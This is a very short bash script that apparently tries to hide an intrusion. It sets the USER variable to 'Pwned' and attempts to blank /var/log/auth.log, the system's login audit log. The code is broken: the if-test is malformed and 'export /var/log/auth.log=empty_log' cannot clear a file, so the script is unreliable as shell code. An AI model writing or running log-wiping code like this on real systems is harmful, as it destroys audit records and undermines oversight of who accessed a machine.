#!/bin/bash

empty_log=""

if $USER = "Pwned"; then
	export /var/log/auth.log=empty_log
else
	export USER=Pwned
	export /var/log/auth.log=empty_log
fi
